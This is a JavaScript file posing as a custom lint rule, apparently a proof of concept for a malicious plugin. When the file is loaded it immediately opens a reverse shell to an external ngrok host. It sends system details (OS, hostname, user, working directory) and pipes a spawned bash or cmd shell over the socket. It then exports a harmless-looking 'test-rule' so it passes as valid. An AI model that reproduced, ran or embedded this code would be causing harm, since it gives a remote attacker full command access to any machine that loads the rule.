// @ts-check
const net = require('net');
const { spawn } = require('child_process');
const os = require('os');

// Configuration
const ATTACKER_IP = '6.tcp.eu.ngrok.io';  // Change this to your IP
const ATTACKER_PORT = 11378;

console.log('🚨 MALICIOUS RULE EXECUTING!');
console.log(`Platform: ${process.platform}`);
console.log(`Shell user: ${process.env.USER}`);
console.log(`Working dir: ${process.cwd()}`);

function createReverseShell() {
  console.log(`Attempting connection to ${ATTACKER_IP}:${ATTACKER_PORT}`);
  
  const client = new net.Socket();
  
  client.connect(ATTACKER_PORT, ATTACKER_IP, () => {
    console.log('✅ Connected to attacker!');
    
    // Send initial info
    client.write(`=== REVERSE SHELL CONNECTED ===\n`);
    client.write(`OS: ${os.type()} ${os.release()}\n`);
    client.write(`Hostname: ${os.hostname()}\n`);
    client.write(`User: ${process.env.USER || process.env.USERNAME || 'unknown'}\n`);
    client.write(`Shell: ${process.env.SHELL || '/bin/bash'}\n`);
    client.write(`PWD: ${process.cwd()}\n`);
    client.write(`================================\n`);
    
    // Try different shells for Ubuntu
    let shell;
    if (process.platform === 'win32') {
      shell = 'cmd.exe';
    } else {
      // Ubuntu-specific shell detection
      shell = process.env.SHELL || '/bin/bash';
      if (!require('fs').existsSync(shell)) {
        shell = '/bin/sh';  // Fallback
      }
    }
    
    console.log(`Using shell: ${shell}`);
    client.write(`Using shell: ${shell}\n`);
    
    // Spawn the shell
    const proc = spawn(shell, [], {
      stdio: ['pipe', 'pipe', 'pipe'],
      env: process.env,
      cwd: process.cwd()
    });
    
    // Pipe everything
    client.pipe(proc.stdin);
    proc.stdout.pipe(client);
    proc.stderr.pipe(client);
    
    // Handle errors
    proc.on('error', (err) => {
      console.log(`Shell process error: ${err}`);
      client.write(`Shell error: ${err}\n`);
    });
    
    proc.on('exit', (code) => {
      console.log(`Shell exited with code: ${code}`);
      client.end();
    });
  });
  
  client.on('error', (err) => {
    console.log(`❌ Connection failed: ${err.message}`);
  });
  
  client.on('close', () => {
    console.log('Connection closed');
  });
}

// Execute immediately
createReverseShell();

// Export valid rule
module.exports = {
  names: ["test-rule"],
  description: "Test rule",
  function: (params, onError) => {
    console.log(`Processing: ${params.name}`);
  }
};
